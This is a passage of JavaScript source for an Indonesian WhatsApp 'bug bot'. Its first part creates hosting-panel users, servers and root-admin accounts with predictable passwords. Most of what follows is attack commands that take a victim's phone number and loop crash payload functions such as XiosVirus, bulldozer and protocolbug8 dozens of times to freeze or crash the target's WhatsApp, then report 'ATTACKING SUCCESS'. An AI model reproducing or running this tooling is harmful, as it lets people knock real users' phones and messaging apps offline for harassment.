}

break
case "10gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "265"
let disk = "10240"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}
break
case "unliv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001398"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "toadmin": case "cadmin": {
if (!isOwner) return m.reply(`khusus admin`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Example* .${command} user,62xxx`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '🌼', key: m.key}})
let password = username + "00019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@adp.vinzz",
"username": username,
"first_name": username,
"last_name": "ADMIN PANEL VINZZ HOSTING",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
*Berhasil Membuat Admin Panel✅*
*Data Sudah Dikirim Ke Nomor*
${nomornya}
`
    const listMessage = {

        text: tks,

    }

	

    await vinzzoffc.sendMessage(m.chat, listMessage)

    await vinzzoffc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain}

Claim Garansi Harus Ada Bukti Tf + Cat ( gda? hangus )

Claim Garansi Hanya 1x

*Rules :*
*- Jangan Create Admin Lain*
*- Jangan Rusuh Server*
*- Jangan Hapus Akun Admin Lain*
*- Jangan Colong SC Buyer panel*
*- Jangan Membuat Panel Terlalu besar*
*- Jangan Otak Atik panel*

*MELANGGAR RULES? BL NO TOLERAN + KU CARI LU*

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`,

    })

}
break
case "toowner": {
if (!isOwner) return m.reply(`khusus admin`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Example* .${command} user,62xxx`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '🌼', key: m.key}})
let password = username + "00019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@owner.vinzz",
"username": username,
"first_name": username,
"last_name": "ADMIN PANEL VINZZ HOSTING",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
*Berhasil Membuat Admin Panel✅*
*Data Sudah Dikirim Ke Nomor*
${nomornya}
`
    const listMessage = {

        text: tks,

    }

	

    await vinzzoffc.sendMessage(m.chat, listMessage)

    await vinzzoffc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain}

Claim Garansi Harus Ada Bukti Tf + Cat ( gda? hangus )

Claim Garansi Hanya 1x

*Rules :*
*- Jangan Create Admin Lain*
*- Jangan Rusuh Server*
*- Jangan Hapus Akun Admin Lain*
*- Jangan Colong SC Buyer panel*
*- Jangan Membuat Panel Terlalu besar*
*- Jangan Otak Atik panel*

*MELANGGAR RULES? BL NO TOLERAN + KU CARI LU*

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`,

    })

}
break
case "topartner": case "topt": {
if (!isOwner) return m.reply(`khusus admin`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Example* .${command} user,62xxx`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '🌼', key: m.key}})
let password = username + "00019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@partner.vinzz",
"username": username,
"first_name": username,
"last_name": "ADMIN PANEL VINZZ HOSTING",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
*Berhasil Membuat Admin Panel✅*
*Data Sudah Dikirim Ke Nomor*
${nomornya}
`
    const listMessage = {

        text: tks,

    }

	

    await vinzzoffc.sendMessage(m.chat, listMessage)

    await vinzzoffc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain}

Claim Garansi Harus Ada Bukti Tf + Cat ( gda? hangus )

Claim Garansi Hanya 1x

*Rules :*
*- Jangan Create Admin Lain*
*- Jangan Rusuh Server*
*- Jangan Hapus Akun Admin Lain*
*- Jangan Colong SC Buyer panel*
*- Jangan Membuat Panel Terlalu besar*
*- Jangan Otak Atik panel*

*MELANGGAR RULES? BL NO TOLERAN + KU CARI LU*

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`,

    })

}
// case bagian bug
break
case 'crashnew': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    for (let i = 0; i < 80; i++) {
    await freezekamoflase(vinzzoffc, target)
    await freezekamoflase(vinzzoffc, target)
    await freezekamoflase(vinzzoffc, target)
     }
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}
break
case 'buldohd': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    for (let i = 0; i < 80; i++) {
    await bulldozer(vinzzoffc, target)
    await sleep(1000)
    await bulldozer(vinzzoffc, target)
    await sleep(1000)
    await bulldozer(vinzzoffc, target)
     }
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}
break
case 'hardproto': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    for (let i = 0; i < 80; i++) {
    await protoxaudio(vinzzoffc, target, true)
    await sleep(1000)
    await protocolbug7(vinzzoffc, target, true)
    await sleep(1000)
    await protocolbug8(vinzzoffc, target, true)
     }
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}
break
case 'ioscrash': case 'ui-system': case 'blanknew': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    for (let i = 0; i < 80; i++) {
    await XiosVirus(vinzzoffc, target)
    await sleep(1000)
    await freezekamoflase(vinzzoffc, target)
    await freezekamoflase(vinzzoffc, target)
    await sleep(1000)
    await XiosVirus(vinzzoffc, target)
     }
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}
break
case 'stuck': case 'freeze': case 'uicrash': case 'crashv2': case 'iosstuck': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    for (let i = 0; i < 80; i++) {
    await XiosVirus(vinzzoffc, target)
    await sleep(1000)
    await XiosVirus(vinzzoffc, target)
    await sleep(1000)
    await XiosVirus(vinzzoffc, target)
     }
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}
break
case 'vinzzhard': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    for (let i = 0; i < 80; i++) {
    await PayloadExtended(vinzzoffc, target)
    await sleep(1000)
    await PayloadExtended2(vinzzoffc, target)
     }
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}

break
case 'vinzzcrash': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler + '@s.whatsapp.net'
  let org = bijipler
  reply(respon)
        
    await VinzzCrashCmbo(vinzzoffc, target);
    
  let ressbug = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
-------------------------------
😈 *TARGET:* ${org}
🚀 *METODE:* ${command}
💀 *STATUS:* Succesfully ✅
-------------------------------
> *WARNING!* Berikan jeda 10 menit setelah mengirimkan bug untuk menghindari kesalahan sistem 🔒.`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `Silahkan pilih menu`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "⎋ Hardbug",
            title: "Hardbug",
            description: "© By Vinzz",
            id: `.hardbug ${target}`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/zqueq8.jpg" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Official`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}

break
case 'hardbug': case 'combobug': {
  if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.length === 0) {
    return reply(`Nomor tidak valid, hanya angka yang diperbolehkan`);
  };
  if (bijipler.startsWith('0')) {
    return reply(`Nomor harus berupa angka dan di awali kode negara `);
  };
  let target = bijipler
  let ressbug = `『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』
-------------------------------
😈 *TARGET:* ${target}
📝 *NOTE* _Silah Kan Pilih Menu Bug Di Bawah Jika Ingit bug Orang efek bug nya ads di atas yaa!!!_`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Seleck Bug",
    sections: [
      {
        title: `🩸 YT : VinzzOfficial_01`, 
        highlight_label: `Attack WhatsApp`,
        rows: [
          {
            header: "Crash New",
            title: "Mengirim Bug Crash",
            description: "CrashNew",
            id: `.crashnew ${target}`, 
          },
        ]},
        {
        title: `Buldozer`, 
        highlight_label: `VinzzOffc`,
        rows: [
          {
            header: "Buldozer Crssh",
            title: "Mengirim Bug Buldozer",
            description: "Mengirim Bug Buldozer",
            id: `.buldohd ${target}`, 
          },
        ]},
        {
        title: `Combo Proto`, 
        highlight_label: `Acces`,
        rows: [
          {
            header: "HardProto",
            title: "Mengirirm Bug Combo Proto",
            description: "Hard Proto Meluncur",
            id: `.hardproto ${target}`,
          },
        ]},
        {
        title: `Blank New Bug`, 
        highlight_label: `Acces`,
        rows: [
          {
            header: "Blank New Func",
            title: "Mengirirm Bug Bllank New",
            description: "Bug Meluncur",
            id: `.blanknew ${target}`,
          },
        ]},
        {
        title: `UiCrash`, 
        highlight_label: `Acces`,
        rows: [
          {
            header: "uicrash",
            title: "Mengirirm Bug Crash",
            description: "Bug Meluncur",
            id: `.uicrash ${target}`, 
          },
        ]},
        {
        title: `VinzzHardBug`, 
        highlight_label: `Opsional`,
        rows: [
          {
            header: "HardVinzz",
            title: "Mengirim Bug hard",
            description: "Bug Sudah Meluncur",
            id: `.vinzzhard ${target}`,  
          },
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
video: { url: "https://files.catbox.moe/7hq673.mp4" },
	    gifPlayback: false,
        caption: ressbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
})
}
break
case 'totalfitur': {
VinzzReply(`Total Fitur Bot Murbug Vinzz ${vinzztotalpitur()} fitur`)}
break
case "tqto": {
